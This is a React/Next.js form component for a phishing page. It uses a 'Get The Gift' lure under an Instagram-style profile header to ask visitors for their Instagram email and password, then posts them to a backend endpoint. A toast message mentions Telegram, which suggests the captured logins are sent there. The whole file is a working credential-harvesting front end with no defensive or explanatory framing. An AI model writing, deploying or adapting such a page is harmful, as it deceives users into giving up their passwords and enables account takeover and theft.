'use client'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { DialogHeader, DialogTitle } from '@/components/ui/dialog'
import { Avatar, AvatarFallback, AvatarImage } from '@/components/ui/avatar'
import React, { useState } from 'react'
import { toast } from 'sonner'
import axios from 'axios'
import { Spinner } from '@/components/ui/spinner'

export default function InfoForm() {
   const [loading, setLoading] = useState(false)

   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
      e.preventDefault()
      const formData = new FormData(e.currentTarget)
      const email = formData.get('email') as string
      const password = formData.get('password') as string
      const isValid = validateInfo(email, password)

      if (!isValid) return

      setLoading(true)

      try {
         const res = await axios.post('/api/message', { email, password })
         if (res.data.success) {
            toast.success('Gift claimed successfully! 🎉', {
               description: 'Check your Telegram for confirmation.',
            })
            // Optionally reset form
            e.currentTarget.reset()
         } else {
            toast.error(res.data.msg || 'Failed to send message ❌')
         }
      } catch (err: any) {
         toast.error(err?.response?.data?.msg || 'Something went wrong')
      } finally {
         setLoading(false)
      }
   }

   return (
      <div className='flex items-center justify-center min-h-[70vh]'>
         <div className='flex flex-1 flex-col justify-center px-4 py-10 lg:px-6'>
            <div className='sm:mx-auto sm:w-full sm:max-w-sm'>
               <DialogHeader className='flex justify-center items-center gap-3 flex-col'>
                  <Avatar className='h-20 w-20'>
                     <AvatarImage src='img.png' />
                     <AvatarFallback>EL</AvatarFallback>
                  </Avatar>
                  <p className='text-muted-foreground text-sm'>_.elham436</p>
                  <DialogTitle className='text-center text-xl font-semibold text-foreground'>
                     Your Instagram Info
                  </DialogTitle>
               </DialogHeader>
               <form className='mt-6 space-y-4' onSubmit={handleSubmit}>
                  <div>
                     <Label htmlFor='email' className='text-sm font-medium'>
                        Instagram Email
                     </Label>
                     <Input
                        type='email'
                        id='email'
                        name='email'
                        autoComplete='email'
                        placeholder='elham@gmail.com'
                        className='mt-2'
                     />
                  </div>
                  <div>
                     <Label htmlFor='password' className='text-sm font-medium'>
                        Password
                     </Label>
                     <Input
                        type='password'
                        id='password'
                        name='password'
                        autoComplete='password'
                        placeholder='*******'
                        className='mt-2'
                     />
                  </div>
                  <Button
                     type='submit'
                     disabled={loading}
                     className='mt-8 w-full py-2 font-medium relative'
                  >
                     {loading ? <Spinner /> : <span>Get The Gift</span>}
                     <span className='absolute text-5xl -top-7 right-0'>🎁</span>
                     <span className='absolute text-5xl -bottom-7 left-0'>🎁</span>
                  </Button>
               </form>
            </div>
         </div>
      </div>
   )
}

// validateEmail and validateInfo remain unchanged

export const validateEmail = (email: string): boolean => {
   return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.toLowerCase())
}
export function validateInfo(email: string, password: string): boolean {
   if (!email || !password) {
      toast.error('Missing Fields', { description: 'All inputs are required.' })
      return false
   }

   if (!validateEmail(email)) {
      toast.error('Invalid Email', {
         description: 'Please enter a valid email address.'
      })
      return false
   }

   if (password.trim().length < 8) {
      toast.error('Weak Password', {
         description: 'Password must be at least 8 characters long.'
      })
      return false
   }

   return true
}
